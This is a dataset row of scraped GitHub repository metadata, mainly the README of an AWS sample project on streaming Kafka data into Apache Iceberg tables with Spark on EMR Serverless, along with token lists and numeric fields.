'builder', 'instance', 'creates', 'instance', 'create', 'delete', 'builder', 'instance', 'creates', 'instance', 'create', 'update', 'builder', 'instance', 'creates', 'instance', 'create', 'insert', 'builder', 'instance', 'creates', 'instance', 'data', 'operation', 'get', 'data', 'id', 'function', 'query', 'data', 'based', 'provided', 'list', 'id', 'parameter', 'list', 'serializable', 'id', 'return', 'response', 'containing', 'query', 'result', 'delete', 'data', 'function', 'delete', 'data', 'based', 'provided', 'list', 'id', 'parameter', 'list', 'serializable', 'id', 'return', 'response', 'deletion', 'operation', 'update', 'data', 'function', 'update', 'data', 'based', 'provided', 'entity', 'parameter', 'list', 'entity', 'object', 'return', 'response', 'update', 'operation', 'insert', 'data', 'function', 'insert', 'provided', 'entity', 'database', 'parameter', 'list', 'entity', 'object', 'return', 'response', 'insertion', 'operation', 'builder', 'method', 'create', 'general', 'builder', 'instance', 'initializes', 'return', 'builder', 'instance', 'lambdaquerywrapper', 'class', 'functional', 'documentation', 'builder', 'class', 'used', 'construct', 'execute', 'milvus', 'search', 'query', 'provides', 'series', 'method', 'set', 'query', 'parameter', 'ultimately', 'execute', 'query', 'constructor', 'lambdaquerywrapper', 'constructor', 'lambdaquerywrapper', 'string', 'collectionname', 'client', 'conversioncache', 'conversioncache', 'class', 'entitytype', 'constructor', 'initializes', 'collection', 'name', 'milvus', 'client', 'type', 'conversion', 'cache', 'entity', 'type', 'partition', 'setting', 'partition', 'string', 'partitionname', 'add', 'one', 'partition', 'name', 'query', 'partition', 'fieldfunction', 'partitionname', 'add', 'partition', 'name', 'based', 'provided', 'field', 'function', 'search', 'parameter', 'setting', 'searchparams', 'map', 'string', 'object', 'searchparams', 'set', 'search', 'parameter', 'following', 'parameter', 'supported', 'searchparams', 'description', 'type', 'string', 'description', 'specifies', 'metric', 'type', 'used', 'search', 'operation', 'must', 'consistent', 'metric', 'type', 'used', 'indexing', 'vector', 'field', 'optional', 'value', 'euclidean', 'distance', 'suitable', 'vector', 'search', 'space', 'ip', 'inner', 'product', 'suitable', 'cosine', 'similarity', 'search', 'cosine', 'cosine', 'similarity', 'inner', 'product', 'suitable', 'measuring', 'angle', 'vector', 'example', 'radius', 'type', 'float', 'description', 'set', 'minimum', 'similarity', 'threshold', 'search', 'operation', 'set', 'value', 'greater', 'otherwise', 'less', 'example', 'radius', 'type', 'float', 'description', 'limit', 'similarity', 'range', 'search', 'operation', 'set', 'ip', 'cosine', 'value', 'greater', 'radius', 'otherwise', 'less', 'radius', 'example', 'use', 'example', 'following', 'example', 'using', 'searchparams', 'showing', 'build', 'search', 'request', 'set', 'specific', 'search', 'parameter', 'radius', 'object', 'radius', 'set', 'search', 'radius', 'rangefilter', 'object', 'rangefilter', 'set', 'range', 'filter', 'metrictype', 'object', 'set', 'metric', 'type', 'result', 'setting', 'outputfields', 'list', 'outputfields', 'set', 'field', 'returned', 'rounddecimal', 'int', 'rounddecimal', 'set', 'number', 'decimal', 'place', 'returned', 'distance', 'value', 'query', 'condition', 'construction', 'eq', 'string', 'fieldname', 'object', 'value', 'add', 'equal', 'condition', 'ne', 'string', 'fieldname', 'object', 'value', 'add', 'equal', 'condition', 'gt', 'string', 'fieldname', 'object', 'value', 'add', 'greater', 'condition', 'ge', 'string', 'fieldname', 'object', 'value', 'add', 'greater', 'equal', 'condition', 'lt', 'string', 'fieldname', 'object', 'value', 'add', 'less', 'condition', 'le', 'string', 'fieldname', 'object', 'value', 'add', 'less', 'equal', 'condition', 'string', 'fieldname', 'object', 'start', 'object', 'end', 'add', 'range', 'condition', 'isnull', 'string', 'fieldname', 'add', 'null', 'check', 'condition', 'isnotnull', 'string', 'fieldname', 'add', 'null', 'check', 'condition', 'string', 'fieldname', 'list', 'value', 'add', 'condition', 'like', 'string', 'fieldname', 'string', 'value', 'add', 'like', 'condition', 'json', 'array', 'operation', 'jsoncontains', 'string', 'fieldname', 'object', 'value', 'add', 'json', 'contains', 'condition', 'jsoncontainsall', 'string', 'fieldname', 'list', 'value', 'add', 'json', 'contains', 'value', 'condition', 'jsoncontainsany', 'string', 'fieldname', 'list', 'value', 'add', 'json', 'contains', 'value', 'condition', 'arraycontains', 'string', 'fieldname', 'object', 'value', 'add', 'array', 'contains', 'condition', 'arraycontainsall', 'string', 'fieldname', 'list', 'value', 'add', 'array', 'contains', 'value', 'condition', 'arraycontainsany', 'string', 'fieldname', 'list', 'value', 'add', 'array', 'contains', 'value', 'condition', 'arraylength', 'string', 'fieldname', 'int', 'length', 'add', 'array', 'length', 'condition', 'logical', 'operation', 'conditionbuilder', 'add', 'condition', 'conditionbuilder', 'add', 'condition', 'add', 'condition', 'vector', 'search', 'setting', 'annsfield', 'string', 'annsfield', 'set', 'vector', 'field', 'searched', 'vector', 'list', 'vector', 'add', 'vector', 'searched', 'vector', 'string', 'annsfield', 'list', 'vector', 'set', 'vector', 'field', 'add', 'vector', 'searched', 'topk', 'integer', 'topk', 'set', 'result', 'returned', 'limit', 'long', 'limit', 'set', 'limit', 'number', 'query', 'result', 'executing', 'query', 'query', 'build', 'executes', 'search', 'request', 'returning', 'wrapped', 'object', 'containing', 'query', 'result', 'query', 'fieldfunction', 'outputfields', 'set', 'output', 'field', 'executes', 'query', 'query', 'string', 'outputfields', 'set', 'output', 'field', 'executes', 'query', 'getbyid', 'serializable', 'id', 'get', 'data', 'id', 'helper', 'method', 'buildsearch', 'build', 'complete', 'search', 'request', 'object', 'buildquery', 'build', 'query', 'request', 'object', 'class', 'provides', 'wealth', 'method', 'build', 'complex', 'search', 'query', 'supporting', 'various', 'condition', 'logical', 'operation', 'json', 'array', 'operation', 'vector', 'search', 'calling', 'method', 'chain', 'user', 'flexibly', 'construct', 'search', 'request', 'obtain', 'desired', 'query', 'result', 'lambdadeletewrapper', 'builder', 'class', 'used', 'construct', 'execute', 'deletion', 'operation', 'add', 'partition', 'add', 'equal', 'condition', 'add', 'equal', 'condition', 'add', 'id', 'deletion', 'list', 'executing', 'deletion', 'execute', 'deletion', 'build', 'executes', 'deletion', 'request', 'delete', 'id', 'lambdaupdatewrapper', 'builder', 'class', 'used', 'construct', 'execute', 'update', 'operation', 'add', 'partition', 'execute', 'insertion', 'operation', 'add', 'partition', 'add', 'field', 'value', 'executing', 'insertion', 'insert', 'data', 'build', 'executes', 'insertion', 'request', 'insert', 'multiple', 'data', 'milvusservice', 'functionality', 'comprehensive', 'service', 'provides', 'full', 'management', 'milvus', 'database', 'implement', 'multiple', 'interface', 'identity', 'access', 'management', 'service', 'collection', 'management', 'service', 'vector', 'management', 'service', 'identity', 'access', 'management', 'iamservice', 'interface', 'provides', 'function', 'creating', 'deleting', 'querying', 'user', 'role', 'well', 'granting', 'revoking', 'permission', 'create', 'role', 'create', 'user', 'describe', 'role', 'permission', 'describe', 'user', 'information', 'drop', 'role', 'drop', 'user', 'grant', 'role', 'permission', 'grant', 'user', 'role', 'list', 'roles', 'list', 'user', 'revoke', 'role', 'permission', 'revoke', 'user', 'role', 'update', 'user', 'password', 'collection', 'management', 'icmservice', 'interface', 'provides', 'function', 'creating', 'deleting', 'querying', 'renaming', 'managing', 'index', 'collection', 'create', 'collection', 'add', 'field', 'get', 'field', 'describe', 'collection', 'drop', 'collection', 'check', 'collection', 'exists', 'get', 'collection', 'statistic', 'rename', 'collection', 'create', 'index', 'collection', 'describe', 'index', 'collection', 'drop', 'index', 'collection', 'get', 'loading', 'status', 'collection', 'partition', 'load', 'collection', 'data', 'memory', 'release', 'collection', 'data', 'memory', 'create', 'partition', 'collection', 'drop', 'partition', 'collection', 'check', 'partition', 'exists', 'list', 'partition', 'collection', 'load', 'partition', 'collection', 'memory', 'release', 'partition', 'collection', 'memory', 'vector', 'management', 'ivecmservice', 'interface', 'provides', 'function', 'inserting', 'updating', 'querying', 'deleting', 'vector', 'performing', 'similarity', 'search', 'delete', 'entity', 'get', 'entity', 'id', 'insert', 'data', 'query', 'scalar', 'filter', 'condition', 'perform', 'vector', 'similarity', 'search', 'upsert', 'data', 'public', 'method', 'addition', 'functionality', 'also', 'provides', 'public', 'method', 'obtain', 'instance', 'get', 'milvus', 'client', 'usage', 'example', 'example', 'using', 'milvusplus', 'vector', 'search', 'example', 'usage', 'contributing', 'contribution', 'welcome', 'report', 'issue', 'suggest', 'feature', 'opening', 'issue', 'submit', 'change', 'creating', 'pull', 'request', 'license', 'milvusplus', 'open', 'source', 'available', 'license', 'contact', 'question', 'support', 'reach', 'javpower']","['add', 'condition', 'collection', 'search', 'string']",13,0,0,"['milvusplus', 'enhanced', 'vector', 'database', 'operation', 'library', 'project', 'introduction', 'feature', 'quick', 'start', 'note', 'configuration', 'file', 'application', 'scenario', 'detailed', 'explanation', 'custom', 'annotation', 'extraparam', 'annotation', 'milvuscollection', 'annotation', 'milvusfield', 'annotation', 'milvusindex', 'annotation', 'milvuspartition', 'annotation', 'detail', 'explanation', 'index', 'metric', 'type', 'index', 'type', 'indextype', 'metric', 'type', 'metrictype', 'milvusmapper', 'functionality', 'milvusmapper', 't', 'basemilvusmapper', 't', 'data', 'operation', 'builder', 'method', 'lambdaquerywrapper', 't', 'class', 'functional', 'documentation', 'constructor', 'partition', 'setting', 'search', 'parameter', 'setting', 'result', 'setting', 'query', 'condition', 'construction', 'json', 'array', 'operation', 'logical', 'operation', 'vector', 'search', 'setting', 'execute', 'query', 'helper', 'method', 'lambdadeletewrapper', 't', 'execute', 'deletion', 'lambdaupdatewrapper', 't', 'execute', 'insertion', 'milvusservice', 'functionality', 'identity', 'access', 'management', 'iamservice', 'collection', 'management', 'icmservice', 'vector', 'management', 'ivecmservice', 'public', 'method', 'usage', 'example', 'contribute', 'license', 'contact']",45,"['annotation', 't', 'operation', 'setting', 'vector']",7,0.0,8.0,"[ org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.codehaus.mojo:flatten-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,6.0,2.0,27006,19.52760736196319,6.152371976123154,"['MilvusPlus -> https://milvusplus.cn/', 'Milvus -> https://milvus.io', 'opening an issue -> https://github.com/yourusername/MilvusPlus/issues/new', 'creating a pull request -> https://github.com/yourusername/MilvusPlus/compare', 'License -> https://github.com/yourusername/MilvusPlus/blob/master/LICENSE']",5
aws-samples/iceberg-streaming-examples,main,"# Streaming Apache Iceberg examples using Apache Spark
AWS Managed Kafka and Apache Kafka, a distributed event streaming platform, has become the de facto standard for building real-time data pipelines. However, ingesting and storing large amounts of streaming data in a scalable and performant manner can be complex and resource-intensive task, often leading to performance issues and increased costs.

This project covers  how open table formats, such as Apache Iceberg, can help address these challenges. It provides  a solution that combines the power of [Apache Kafka](https://kafka.apache.org/) , [Apache Spark](https://spark.apache.org/), and [Apache Iceberg](https://iceberg.apache.org/) to achieve high-throughput streaming ingestion

The focus in this repository is to go further than the typical poc consuming few messages or small csv files. The aim here is to provide support for around **400,000 msg/seg** on all scenarios. 

The concepts seen here are applicable to PySpark or Scala programs with little effort. Remember that we just program
the transformations and those are converted to a logical plan and then to native code via the Java Virtual Machine (JVM) or to native code using projects such as [Apache Data Fusion Comet](https://github.com/apache/datafusion-comet), [Velox](https://github.com/apache/datafusion-comet) or [Photon](https://www.databricks.com/product/photon).

Why Java? Because why not, remember that this nowadays gets executed by the JVM ( until previous projects arise). Remember that with this approach we can use libraries in an easy way ( without the Scala/Python/Java 'mess'), we can program performant UDFs and there is a friendly local development environment (where you can debug everything with breakpoints) with different options.

The example uses maven profiles to automatically filter required libraries when deployed to [Amazon EMR](https://aws.amazon.com/emr/) ( the Spark and Iceberg libraries will be marked as provided) and therefore you will be using the optimized Spark runtime from EMR. The logging is implemented using [Log4j2](https://logging.apache.org/log4j/2.12.x/) ( where its config can be further tuned using EMR Serverless configs) as Spark uses it behind the scenes. 

**Environment types:** 

- Local development using a [dockerized Kafka](https://github.com/bitnami/containers/blob/main/bitnami/kafka/).
- Local development against Amazon S3, and AWS Glue Catalog, here we will also use the dockerized Kafka.
- Production mode where we can deploy the code to an Amazon EMR Serverless cluster.

You can run these examples on any Spark compatible runtime too, but that's for a pull request ( if you like to contribute).

In the case of Amazon Web Services on AWS Glue, Amazon EMR or Amazon EMR Serverless.
æ
Remember also that these jobs and code can be adapted for **batch mode** easily (and remember that you can use Kafka as batch source!). A batch job is just a special streaming job with a start and an end anyway.

### A note on performance

Although the code here aims for performance more tuning can be done for achieving specific goals such as improving latency.

Remember that Apache Iceberg have merge-on-read capabilities. In this repo, the default settings for tables are used
but mixing copy-on-write with merge-on-read can lead to some gains as we will write faster.

Remember that this is not a free lunch, you will need to compact if you want good performance.

Another cool thing to test is to use Avro for the ingestion tables and then compact to parquet. 

A good doc to read about these settings and more can be seen on the [Best Practices for Optimizing Apache Iceberg workloads](https://docs.aws.amazon.com/prescriptive-guidance/latest/apache-iceberg-on-aws/best-practices.html) from AWS Documentation.

Another good read can be seen on this blog from Cloudera: [Optimization Strategies for Iceberg Tables](https://blog.cloudera.com/optimization-strategies-for-iceberg-tables/)

## IoT Scenarios

Here we have different approaches and comœmon formats. About the different scenarios the main idea is high throughput streaming
ingestion:
- Native Iceberg writing with deduplication via even-time watermarking.
- Custom process writing with compaction via n-batches and deduplication via merge into.
- Custom process writing with async compaction and Merge-on-read mode.

For the different formats we will have the native use case implemented and the ProtoBuf one will have all the scenarios.

The most advanced example using Protocol Buffers is in ```com.aws.emr.spark.iot``` package.

Later on a job rewriting older partitions to check for duplicates are found and rewrite affected partitions may run. 
An example of such approach can be seen also on the Utils class of ```com.aws.emr.spark.iot``` package.

Remember that exactly once systems are difficult to implement and that for Spark you will need and idempotent sink.

If you want to use the GlueSchemaRegistry you should create in the console a stream registry named ```employee-schema-registry```.

### Protocol Buffers

[Protocol Buffers](https://protobuf.dev/) are language-neutral, platform-neutral extensible mechanisms for serializing structured data.

**Examples**: 
- Native Java Producer/Consumer. 
- AWS Glue Registry based Java Producer/Consumer.
- Native Spark Structured streaming consumer. 
- UDF based Spark Structured streaming consumer.

Create a schema for the Glue registry ```Employee.proto``` if you like to use the Registry based producer/consumer:

```
syntax = ""proto3"";
package gsr.proto.post;

import ""google/protobuf/wrappers.proto"";
import ""google/protobuf/timestamp.proto"";

message Employee {
      int32 id = 1;
      string name = 2;
      string address = 3;
      google.protobuf.Int32Value employee_age = 4;
      google.protobuf.Timestamp start_date = 5;
     Team team = 6;
     Role role = 7;

}
message Team {
     string name = 1;
     string location = 2;
}
enum Role {
     MANAGER = 0;
     DEVELOPER = 1;
     ARCHITECT = 2;
}
```

### Apache Avro

[Apache Avro](https://avro.apache.org/) - a data serialization system.

**Examples**: 
- Native Java Producer/Consumer. 
- AWS Glue Registry based Java Producer/Consumer.
- Native Spark Structured streaming consumer. 

Create a schema for the Glue registry ```Employee.avsc``` if you like to use the Registry based producer/consumer:
```
{""namespace"": ""gsr.avro.post"",
 ""type"": ""record"",
 ""name"": ""Employee"",
 ""fields"": [
     {""name"": ""employee_id"", ""type"": ""long""},
     {""name"": ""age"",  ""type"": ""int""},
     {""name"": ""start_date"",   ""type"": ""long""},
   {""name"": ""team"", ""type"": ""string""},
   {""name"": ""role"", ""type"": ""string""},
   {""name"": ""address"", ""type"": ""string""},
   {""name"": ""name"", ""type"": ""string""}]
}
```

### Json

There is plenty of literature over the internet on how integrate Spark with Json data, therefore we just implemented one usecase.

**Examples**:
- AWS Glue Registry based Java Producer/Consumer.


Create a schema for the Glue registry ```Employee.json``` if you like to use the Registry based producer/consumer:
```
{
  ""$id"": ""https://example.com/Employee.schema.json"",
  ""$schema"": ""http://json-schema.org/draft-07/schema#"",
  ""title"": ""Employee"",
  ""description"": """",
  ""type"": ""object"",
  ""properties"": {
    ""employeeId"": {
      ""description"": ""The unique identifier for a employee"",
      ""type"": ""integer""
    },
    ""name"": {
      ""description"": ""Name of the employee"",
      ""type"": ""string""
    }
  }
}

```
## CDC Scenarios

Here the reference is Tabular [Apache Iceberg Cookbook](https://tabular.io/apache-iceberg-cookbook/) and these blogposts:
 - https://tabular.io/blog/hello-world-of-cdc/
 - https://tabular.io/blog/cdc-data-gremlins/#eventual-consistency-causes-data-gremlins
 - https://tabular.io/blog/cdc-merge-pattern/
 - https://tabular.io/blog/cdc-zen-art-of-cdc-performance/

Here we will focus on the Mirror MERGE patter, as stated in the Iceberg Cookbook the first part could be managed by 
the Kafka Connect Tabular connector, but we will implement both processing pipelines using Spark. 

The relevant classes are withing the ```com.aws.emr.spark.cdc``` package.  

 * ```KafkaCDCSimulator``` class is a Java producer simulating CDC data in [AWS Database Migration Service(DMS)](https://aws.amazon.com/es/dms/) format. 
 * ```SparkLogChange```  class is a Structured Streaming consumer that outputs a CDC changelog to an Iceberg table. 
 * ```SparkCDCMirror``` class is a Spark batch pipeline that process the MERGE using the Mirror approach.
 * ```SparkIncrementalPipeline``` class uses Incremental pipeline for consuming the CDC changelog into a target table. 

## Requirements

* Java 17 + ( you could adapt this code easily to run on Java 8 or Java 11)
* Maven 3.9+
* 16GB of RAM and more than 2 cores. 
* Whatever IDE you like ([Intellij](https://www.jetbrains.com/intellij/), [Visual Studio Code](https://code.visualstudio.com/), [NetBeans](https://apache.netbeans.org/), etc)

For local development and testing you can use the provided ```docker-compose.yml``` to spin up a Kafka cluster.

You can generate the description file using the protobuf compiler like this. You need to install the protobuf compiler for your system, for example on MacOs is available on ```brew```. 

```protoc --include_imports --descriptor_set_out=Employee.desc Employee.proto'```

Remember that for simple scenarios you will be better suited using [Kafka Connect Tabular Iceberg Connector](https://github.com/tabular-io/iceberg-kafka-connect/tree/main) or using [Amazon Kinesis Firehose](https://aws.amazon.com/firehose/).

### Running on EMR Serverless:

Create a S3 bucket with the following structure. 

```
s3bucket/
	/jars
	/employee.desc -- or your custom protocol buffers descriptors
	/warehouse
	/checkpoint
```

Package your application using the ```emr``` Maven profile, then upload the jar of the project to the ```jars``` folder. The ```warehouse``` will be the place where the Iceberg Data and Metadata will live and ```checkpoint``` will be used for Structured Streaming checkpointing mechanismn. 
 
Create a Database in the AWS Glue Data Catalog with the name ```bigdata```.

You need to create an EMR Serverless application with ```default settings for batch jobs only```, application type ```Spark``` release version ```7.2.0``` and ```x86_64``` as architecture, enable ```Java 17``` as runtime, enable ```AWS Glue Data Catalog as metastore```
integration and enable ```Cloudwatch logs``` if desired.

Then you can issue a job run using this aws cli command. Remember to change the desired parameters.

```
aws emr-serverless start-job-run     --application-id application-identifier     --name job-run-name     --execution-role-arn arn-of-emrserverless-role --mode 'STREAMING'     --job-driver
	'{
        ""sparkSubmit"": {
            ""entryPoint"": ""s3://s3bucket/jars/streaming-iceberg-ingest-1.0-SNAPSHOT.jar"",
            ""entryPointArguments"": [""true"",""s3a://s3bucket/warehouse"",""/home/hadoop/Employee.desc"",""s3a://s3bucket/checkpoint"",""kafkaBootstrapString"",""true""],
            ""sparkSubmitParameters"": ""--class com.aws.emr.spark.iot.SparkCustomIcebergIngest --conf spark.executor.cores=4 --conf spark.hadoop.hive.metastore.client.factory.class=com.amazonaws.glue.catalog.metastore.AWSGlueDataCatalogHiveClientFactory --conf spark.executor.memory=16g  --conf spark.driver.cores=2 --conf spark.driver.memory=8g  --files s3a://s3bucket/Employee.desc --conf spark.dynamicAllocation.minExecutors=4 --conf spark.jars=/usr/share/aws/iceberg/lib/iceberg-spark3-runtime.jar --conf spark.emr-serverless.executor.disk.type=shuffle_optimized --packages org.apache.spark:spark-sql-kafka-0-10_2.12:3.5.1""
        }
    }'
{	
```

Expected performance should be around 450.000 msgs per sec if you use the ```SparkCustomIcebergIngest```.

<img src=""imgs/emr_performance.png"" align=""center"" height=""450"" width=""600""/>

You can also see the cluster autoscaling into action:

<img src=""imgs/emr_cluster_autoscaling.png"" align=""center"" height=""470"" width=""550""/>

### Running on a local environment.

1. Install a Java SDK 17 like [Amazon Coretto](https://aws.amazon.com/corretto/).
2. Install [Docker](https://www.docker.com/) for your environment. 
3. Open the desired IDE. 
4. Use the IDE to issue the ```package ``` command of maven selecting the local profile.
5. If you wish to use the AWS Glue Data Catalog and S3 remember to have the corresponding permissions (have your AWS credentials avaliable), there are plugins for both [Intellij](https://aws.amazon.com/intellij/?pg=developertools) and [Visual Studio Code](https://aws.amazon.com/visualstudiocode/) that can be helpful here.
6. Start the local Kafka broker via ```docker-compose up``` command.
7. Run the examples with the desired arguments, remember that you will need to add the required VM options for letting Spark to work on Java 17: 
```
--add-opens=java.base/java.lang=ALL-UNNAMED
--add-opens=java.base/java.lang.invoke=ALL-UNNAMED
--add-opens=java.base/java.lang.reflect=ALL-UNNAMED
--add-opens=java.base/java.io=ALL-UNNAMED
--add-opens=java.base/java.net=ALL-UNNAMED
--add-opens=java.base/java.nio=ALL-UNNAMED
--add-opens=java.base/java.util=ALL-UNNAMED
--add-opens=java.base/java.util.concurrent=ALL-UNNAMED
--add-opens=java.base/java.util.concurrent.atomic=ALL-UNNAMED
--add-opens=java.base/sun.nio.ch=ALL-UNNAMED
--add-opens=java.base/sun.nio.cs=ALL-UNNAMED
--add-opens=java.base/sun.security.action=ALL-UNNAMED
--add-opens=java.base/sun.util.calendar=ALL-UNNAMED
--add-opens=java.security.jgss/sun.security.krb5=ALL-UNNAMED
```

### Running the Kafka producer on AWS

Create a Amazon MSK cluster with at leas two brokers using ```3.5.1```, [Apache Zookeeper](https://zookeeper.apache.org/) mode version and use as instance type ```kafka.m7g.xlarge```. Do not use public access and choose two private subnets to deploy it. For the security group remember that the EMR cluster and the EC2 based producer will need to reach the cluster and act accordingly. For security, use ```PLAINTEXT``` (in production you should secure access to the cluster). Choose ```200GB``` as storage size for each broker and do not enable ```Tiered storage```. For the cluster configuration use this one:

```
auto.create.topics.enable=true
default.replication.factor=3
min.insync.replicas=2
num.io.threads=8
num.network.threads=5
num.partitions=32
num.replica.fetchers=2
replica.lag.time.max.ms=30000
socket.receive.buffer.bytes=102400
socket.request.max.bytes=104857600
socket.send.buffer.bytes=102400
unclean.leader.election.enable=true
zookeeper.session.timeout.ms=18000
compression.type=zstd
log.retention.hours=2
log.retention.bytes=10073741824
```

Running the Kafka producer on an Amazon EC2 instance, remember to change the bootstrap connection string.

You will need to install Java if you are using and Amazon Linux instance. 
```
sudo yum install java-17-amazon-corretto-devel
```
Then, download the jar to the instance and execute the producer. With the following command you can start the Protocol Buffers Producer.
```
aws s3 cp s3://s3bucket/jars/streaming-iceberg-ingest-1.0-SNAPSHOT.jar .
java -cp streaming-iceberg-ingest-1.0-SNAPSHOT.jar com.aws.emr.proto.kafka.producer.ProtoProducer kafkaBoostrapString
```

Remember that your EC2 instance need to have network access to the MSK cluster, you will need to configure the VPC, Security Groups and Subnet/s. 

## Costs

Remember that this example is for high throughput scenarios and therefore the config may lead to quite big bill if deployed on top of AWS, remember to stop the EMR Serverless application, the used instance for the Kafka producer and delete the Amazon MSK cluster when not in use.

## Security

The code here is not secured in any way, you should secure your Apache Kafka cluster and be aware that some dependencies may have known vulnerabilities. If you deploy any service on top of AWS you should configure the roles using the least permission model
using [IAM roles](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html) and [Amazon Lake Formation](https://aws.amazon.com/lake-formation/) if needed. 

## Contributing

See [CONTRIBUTING](CONTRIBUTING.md) for more information.

## License

This library is licensed under the MIT-0 License. See the LICENSE file.
",1,1,2,mit,0.0,"['streaming', 'apache', 'iceberg', 'example', 'using', 'apache', 'spark', 'aws', 'managed', 'kafka', 'apache', 'kafka', 'distributed', 'event', 'streaming', 'platform', 'become', 'de', 'facto', 'standard', 'building', 'data', 'pipeline', 'however', 'ingesting', 'storing', 'large', 'amount', 'streaming', 'data', 'scalable', 'performant', 'manner', 'complex', 'task', 'often', 'leading', 'performance', 'issue', 'increased', 'cost', 'project', 'cover', 'open', 'table', 'format', 'apache', 'iceberg', 'help', 'address', 'challenge', 'provides', 'solution', 'combine', 'power', 'apache', 'kafka', 'apache', 'spark', 'apache', 'iceberg', 'achieve', 'streaming', 'ingestion', 'focus', 'repository', 'go', 'typical', 'poc', 'consuming', 'message', 'small', 'csv', 'file', 'aim', 'provide', 'support', 'around', 'scenario', 'concept', 'seen', 'applicable', 'pyspark', 'scala', 'program', 'little', 'effort', 'remember', 'program', 'transformation', 'converted', 'logical', 'plan', 'native', 'code', 'via', 'java', 'virtual', 'machine', 'jvm', 'native', 'code', 'using', 'project', 'apache', 'data', 'fusion', 'comet', 'velox', 'photon', 'java', 'remember', 'nowadays', 'get', 'executed', 'jvm', 'previous', 'project', 'arise', 'remember', 'approach', 'use', 'library', 'easy', 'way', 'without', 'program', 'performant', 'udfs', 'friendly', 'local', 'development', 'environment', 'debug', 'everything', 'breakpoints', 'different', 'option', 'example', 'us', 'maven', 'profile', 'automatically', 'filter', 'required', 'library', 'deployed', 'amazon', 'emr', 'spark', 'iceberg', 'library', 'marked', 'provided', 'therefore', 'using', 'optimized', 'spark', 'runtime', 'emr', 'logging', 'implemented', 'using', 'config', 'tuned', 'using', 'emr', 'serverless', 'configs', 'spark', 'us', 'behind', 'scene', 'environment', 'type', 'local', 'development', 'using', 'dockerized', 'kafka', 'local', 'development', 'amazon', 'aws', 'glue', 'catalog', 'also', 'use', 'dockerized', 'kafka', 'production', 'mode', 'deploy', 'code', 'amazon', 'emr', 'serverless', 'cluster', 'run', 'example', 'spark', 'compatible', 'runtime', 'pull', 'request', 'like', 'contribute', 'case', 'amazon', 'web', 'service', 'aws', 'glue', 'amazon', 'emr', 'amazon', 'emr', 'serverless', 'remember', 'also', 'job', 'code', 'adapted', 'batch', 'mode', 'easily', 'remember', 'use', 'kafka', 'batch', 'source', 'batch', 'job', 'special', 'streaming', 'job', 'start', 'end', 'anyway', 'note', 'performance', 'although', 'code', 'aim', 'performance', 'tuning', 'done', 'achieving', 'specific', 'goal', 'improving', 'latency', 'remember', 'apache', 'iceberg', 'capability', 'repo', 'default', 'setting', 'table', 'used', 'mixing', 'lead', 'gain', 'write', 'faster', 'remember', 'free', 'lunch', 'need', 'compact', 'want', 'good', 'performance', 'another', 'cool', 'thing', 'test', 'use', 'avro', 'ingestion', 'table', 'compact', 'parquet', 'good', 'doc', 'read', 'setting', 'seen', 'best', 'practice', 'optimizing', 'apache', 'iceberg', 'workload', 'aws', 'documentation', 'another', 'good', 'read', 'seen', 'blog', 'cloudera', 'optimization', 'strategy', 'iceberg', 'table', 'iot', 'scenario', 'different', 'approach', 'format', 'different', 'scenario', 'main', 'idea', 'high', 'throughput', 'streaming', 'ingestion', 'native', 'iceberg', 'writing', 'deduplication', 'via', 'watermarking', 'custom', 'process', 'writing', 'compaction', 'via', 'deduplication', 'via', 'merge', 'custom', 'process', 'writing', 'async', 'compaction', 'mode', 'different', 'format', 'native', 'use', 'case', 'implemented', 'protobuf', 'one', 'scenario', 'advanced', 'example', 'using', 'protocol', 'buffer', 'package', 'later', 'job', 'rewriting', 'older', 'partition', 'check', 'duplicate', 'found', 'rewrite', 'affected', 'partition', 'may', 'run', 'example', 'approach', 'seen', 'also', 'utils', 'class', 'package', 'remember', 'exactly', 'system', 'difficult', 'implement', 'spark', 'need', 'idempotent', 'sink', 'want', 'use', 'glueschemaregistry', 'create', 'console', 'stream', 'registry', 'named', 'protocol', 'buffer', 'protocol', 'buffer', 'extensible', 'mechanism', 'serializing', 'structured', 'data', 'example', 'native', 'java', 'aws', 'glue', 'registry', 'based', 'java', 'native', 'spark', 'structured', 'streaming', 'consumer', 'udf', 'based', 'spark', 'structured', 'streaming', 'consumer', 'create', 'schema', 'glue', 'registry', 'like', 'use', 'registry', 'based', 'apache', 'avro', 'apache', 'avro', 'data', 'serialization', 'system', 'example', 'native', 'java', 'aws', 'glue', 'registry', 'based', 'java', 'native', 'spark', 'structured', 'streaming', 'consumer', 'create', 'schema', 'glue', 'registry', 'like', 'use', 'registry', 'based', 'json', 'plenty', 'literature', 'internet', 'integrate', 'spark', 'json', 'data', 'therefore', 'implemented', 'one', 'usecase', 'example', 'aws', 'glue', 'registry', 'based', 'java', 'create', 'schema', 'glue', 'registry', 'like', 'use', 'registry', 'based', 'cdc', 'scenario', 'reference', 'tabular', 'apache', 'iceberg', 'cookbook', 'blogposts', 'http', 'http', 'http', 'http', 'focus', 'mirror', 'merge', 'patter', 'stated', 'iceberg', 'cookbook', 'first', 'part', 'could', 'managed', 'kafka', 'connect', 'tabular', 'connector', 'implement', 'processing', 'pipeline', 'using', 'spark', 'relevant', 'class', 'withing', 'package', 'class', 'java', 'producer', 'simulating', 'cdc', 'data', 'aws', 'database', 'migration', 'service', 'dm', 'format', 'class', 'structured', 'streaming', 'consumer', 'output', 'cdc', 'changelog', 'iceberg', 'table', 'class', 'spark', 'batch', 'pipeline', 'process', 'merge', 'using', 'mirror', 'approach', 'class', 'us', 'incremental', 'pipeline', 'consuming', 'cdc', 'changelog', 'target', 'table', 'requirements', 'java', 'could', 'adapt', 'code', 'easily', 'run', 'java', 'java', 'maven', 'ram', 'core', 'whatever', 'ide', 'like', 'intellij', 'visual', 'studio', 'code', 'netbeans', 'etc', 'local', 'development', 'testing', 'use', 'provided', 'spin', 'kafka', 'cluster', 'generate', 'description', 'file', 'using', 'protobuf', 'compiler', 'like', 'need', 'install', 'protobuf', 'compiler', 'system', 'example', 'macos', 'available', 'remember', 'simple', 'scenario', 'better', 'suited', 'using', 'kafka', 'connect', 'tabular', 'iceberg', 'connector', 'using', 'amazon', 'kinesis', 'firehose', 'running', 'emr', 'serverless', 'create', 'bucket', 'following', 'structure', 'package', 'application', 'using', 'maven', 'profile', 'upload', 'jar', 'project', 'folder', 'place', 'iceberg', 'data', 'metadata', 'live', 'used', 'structured', 